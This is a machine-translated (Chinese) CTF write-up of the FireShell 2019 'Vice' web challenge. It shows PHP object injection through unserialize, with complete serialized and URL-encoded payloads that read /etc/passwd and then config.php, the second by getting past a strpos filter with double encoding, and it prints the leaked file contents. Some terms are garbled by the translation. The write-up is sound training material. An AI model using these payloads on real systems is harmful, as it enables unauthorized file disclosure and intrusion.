<html>
<head>
<title>FireShell CTF 2019 | WEB (Vice) Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">凡世尔CTF 2019 |网络(副)报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/fireshell-ctf-2019-web-vice-writeup-2deee8d82556?source=collection_archive---------0-----------------------#2019-01-27">https://infosecwriteups.com/fireshell-ctf-2019-web-vice-writeup-2deee8d82556?source=collection_archive---------0-----------------------#2019-01-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="bb73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">世界协调时2019年1月27日下午19:00+2</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/b551ac4ae519993a36bca2156cf7f114.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5GHlBiNwhMXUptBBY13hWQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">凡世尔CTF 2019 |网络(副)报道</figcaption></figure><p id="f0f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lb">这是一篇为web challenge撰写的文章，曾在</em><a class="ae lc" href="https://ctftime.org/event/727" rel="noopener ugc nofollow" target="_blank"><em class="lb">FireShell CTF 2019</em></a><em class="lb">今天，如果你还不知道，FireShell CTF是一个巴西赛事，风格危险，友好的初学者。这个提议是为了在一个充满挑战但有趣的环境中测试参与者的黑客技能。</em></p><h1 id="d471" class="ld le iq bd lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma bi translated">虎钳—<strong class="ak"/>300分</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/d056723ed6b6d69d9eebb85b6998bd49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1238/format:webp/1*r-JUOkylBWJZqbEY3XlWQA.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">副的</figcaption></figure><p id="73ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个网页任务命名为<strong class="jp ir">副</strong>，根据我解决它时的动态记分牌，是300分。</p><blockquote class="mc md me"><p id="821e" class="jn jo lb jp b jq jr js jt ju jv jw jx mf jz ka kb mg kd ke kf mh kh ki kj kk ij bi translated"><strong class="jp ir">挑战:</strong> <a class="ae lc" href="https://github.com/Abdelkad3r/CTF/blob/master/Fireshell%20CTF%202019/WEB/Vice/Challenge.txt" rel="noopener ugc nofollow" target="_blank">副</a></p></blockquote><p id="d5a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，让我们阅读和理解给定的php脚本，以了解在这个挑战中需要什么:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mi mj l"/></div></figure><p id="824d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个GET参数<strong class="jp ir"> $gg </strong>可能容易受到一些php错误和bug的攻击。我试图通过阅读和理解代码来检测错误，并在我的本地主机上进行测试。</p><p id="9b30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<em class="lb"> unserialize </em>函数对该参数进行非序列化，使用一种称为<em class="lb"> __destruct的神奇方法。</em></p><p id="ecc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这可能是<a class="ae lc" href="https://www.owasp.org/index.php/PHP_Object_Injection" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> PHP对象注入</strong> </a> <strong class="jp ir">，</strong>看看你如何利用这个漏洞，不同的场景和一些有效载荷通过:</p><div class="mk ml gp gr mm mn"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20deserialization/PHP.md" rel="noopener  ugc nofollow" target="_blank"><div class="mo ab fo"><div class="mp ab mq cl cj mr"><h2 class="bd ir gy z fp ms fr fs mt fu fw ip bi translated">swisskyrepo/payloads all things</h2><div class="mu l"><h3 class="bd b gy z fp ms fr fs mt fu fw dk translated">Web应用程序安全和Pentest/CTF-swisskyrepo/payloads all things的有用负载和旁路列表</h3></div><div class="mv l"><p class="bd b dl z fp ms fr fs mt fu fw dk translated">github.com</p></div></div><div class="mw l"><div class="mx l my mz na mw nb kv mn"/></div></div></a></div><p id="641e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我提到的；当一个对象被删除时，有一个神奇的方法<em class="lb"> __destruct </em>将有助于PHP对象注入。</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="126b" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">function __destruct(){<br/>    if(in_array($this-&gt;method,array("doit"))){<br/> <br/>      call_user_func_array(array($this,$this-&gt;method),array());<br/>    }else{<br/>      die(":)");<br/>    }<br/>  }</strong></span></pre><p id="b847" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们将使用带有5个对象的<em class="lb"> SHITS </em>类，其中重要的一个是<em class="lb"> SHITS方法</em>，它被称为<em class="lb"> doit </em>:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="090c" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">function doit(){<br/>    <br/>    $this-&gt;host = @parse_url($this-&gt;url)['host'];<br/>    $this-&gt;addr = @gethostbyname($this-&gt;host);<br/>    $this-&gt;name = @gethostbyaddr($this-&gt;host);<br/>    if($this-&gt;addr !== "127.0.0.1" || $this-&gt;name === false){<br/>      $not = ['.txt','.php','.xml','.html','.','[',']'];<br/>      foreach($not as $ext){<br/>        $p = strpos($this-&gt;url,$ext);<br/>        if($p){<br/>          die(":)");<br/>        }<br/>      }<br/>      $ch = curl_init();<br/>      curl_setopt($ch,CURLOPT_URL,$this-&gt;url);<br/>      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);<br/><br/>      $result = curl_exec($ch);<br/>      echo $result;<br/>    }else{<br/>      die(":)");<br/>    }<br/>  }</strong></span></pre><p id="bb1b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">和<em class="lb"> SHITS url </em>，这可能是一种泄漏<strong class="jp ir"> /etc/passwd，</strong>和最后这里是我的有效载荷泄漏<strong class="jp ir"> /etc/passwd </strong>:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="5e51" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">O:5:"SHITS":5:<br/>{<br/>s:10:"SHITSurl";<br/>s:18:"file:///etc/passwd";<br/>s:13:"SHITSmethod";<br/>s:4:"doit";<br/>s:11:"SHITSaddr";N;<br/>s:11:"SHITShost";N;<br/>s:11:"SHITSname";N;<br/>}</strong></span></pre><p id="f63e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是注入的和URL编码的有效载荷:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="49ce" class="nh le iq nd b gy ni nj l nk nl"><a class="ae lc" href="http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A18%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D" rel="noopener ugc nofollow" target="_blank"><strong class="nd ir">O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A18%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D</strong></a></span></pre><p id="f388" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">而且这里的/etc/passwd已经泄露了！</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="6e1e" class="nh le iq nd b gy ni nj l nk nl"><a class="ae lc" href="http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A18%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D" rel="noopener ugc nofollow" target="_blank"><strong class="nd ir">http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A18%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D</strong></a></span><span id="8a73" class="nh le iq nd b gy nm nj l nk nl">--------------------------------------------------------------------</span><span id="a944" class="nh le iq nd b gy nm nj l nk nl">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span></pre><p id="3bdc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们必须继续我们的黑客攻击…目标是我们必须读取标志，根据给定的php脚本，标志存储在config.php的<em class="lb"/>中，因为这是必需的。所以让我们试着像泄露<strong class="jp ir"> /etc/passwd </strong>一样泄露<em class="lb">config.php</em>。</p><p id="3d39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着用不同的方法来泄露<em class="lb">config.php</em>但是没有结果！</p><p id="e327" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">主要问题是<strong class="jp ir">。php" </strong>是<strong class="jp ir"> </strong>中经过过滤的扩展名之一，所以不能执行<em class="lb">config.php</em>:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nn"><img src="../Images/632932087e6e93717c17d470eef12494.png" data-original-src="https://miro.medium.com/v2/resize:fit:1122/format:webp/1*0JEBAdkEey9f7ik8AFlHHg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">过滤扩展</figcaption></figure><p id="c676" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过几个小时的研究，我刚刚发现了一个漏洞，在<em class="lb"> strpos </em>函数可能被利用，也许它可以导致绕过这个过滤器，并执行<em class="lb">config.php。</em></p><p id="2636" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个bug叫做<a class="ae lc" href="https://bugs.php.net/bug.php?id=76671&amp;edit=1" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> Bypass Strpos验证</strong> </a> <strong class="jp ir">，</strong>这是2018-27-07提交的PHP最新bug之一。这个错误更多地与我们向<em class="lb"> strpos() </em>发送带编码的字符串有关，当我们发送带双重编码的字符串时，我们能够使用<strong class="jp ir"> %2570hp </strong>绕过验证，如果情况类似于<em class="lb">strpos(＄string，" php") </em>。</p><p id="9ef2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，我们有<em class="lb"> strpos($this- &gt; url。php") </em>所以我们必须使用<strong class="jp ir">双重编码</strong>来绕过这个<em class="lb"> strpos </em>验证，以便能够执行<em class="lb">config.php</em>。实际上，只要对<strong class="jp ir">”进行双重编码就足够了。</strong>为该旁路。</p><p id="4a7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">的双重编码。</strong>是<strong class="jp ir"> %252e，</strong>还有一个问题是我甚至不知道<em class="lb">config.php</em>的正确路径，也是在朋友的帮助下才猜出来的，最后是这样:<strong class="jp ir">/var/www/html/config . PHP</strong></p><p id="31bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我用来绕过<em class="lb"> strpos </em>验证并执行<em class="lb">config.php</em>的最终有效载荷，然后读取存储在<em class="lb">config.php</em>脚本中的标志，然后解决这个挑战:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="d532" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">O:5:"SHITS":5:<br/>{<br/>s:10:"SHITSurl";<br/>s:33:"file:///var/www/html/config%252ephp";<br/>s:13:"SHITSmethod";<br/>s:4:"doit";<br/>s:11:"SHITSaddr";N;<br/>s:11:"SHITShost";N;<br/>s:11:"SHITSname";N;<br/>}</strong></span></pre><p id="3bd7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是注入的和URL编码的有效载荷:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="a91f" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D </strong></span></pre><p id="73ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">而这里是config.php已经被处决了！</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="6c41" class="nh le iq nd b gy ni nj l nk nl"><a class="ae lc" href="http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D" rel="noopener ugc nofollow" target="_blank"><strong class="nd ir">http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D</strong></a></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi no"><img src="../Images/8cf8291d7e097e836c95150af92533fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4GWCGqjJNrnKi5b_7C6HWg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">config.php被处决了！</figcaption></figure><p id="0b9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后通过查看config.php页面的源代码来阅读国旗:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi np"><img src="../Images/d3b2f37030d99c7a04ad32bf4279e493.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a7NJvjnjpPJ_YPFbrzoYNA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">查看config.php网页的源代码，然后阅读国旗</figcaption></figure><p id="dcf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如上图，这里是泄露的<em class="lb">config.php</em>剧本:</p><pre class="km kn ko kp gt nc nd ne nf aw ng bi"><span id="7c9c" class="nh le iq nd b gy ni nj l nk nl"><strong class="nd ir">&lt;?php<br/>if($_SERVER['REMOTE_ADDR'] !== '::1' || $_SERVER['REMOTE_ADDR'] !== '127.0.0.1'){<br/>echo "aaawn";<br/>}else{<br/>$flag ="F#{wtf_5trp0s_}";<br/>}</strong></span></pre><blockquote class="mc md me"><p id="1706" class="jn jo lb jp b jq jr js jt ju jv jw jx mf jz ka kb mg kd ke kf mh kh ki kj kk ij bi translated">标志是:<strong class="jp ir"> F#{wtf_5trp0s_} </strong></p></blockquote><p id="d1c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个很好的网络挑战，我只是和我的朋友和队友一起享受，我要感谢<a class="ae lc" href="https://ctftime.org/team/25526" rel="noopener ugc nofollow" target="_blank"> <em class="lb"> FireShell团队</em> </a>创造了这样一个有趣的任务，也感谢他们组织了这次CTF。</p><p id="1d45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最诚挚的问候，</p></div></div>    
</body>
</html>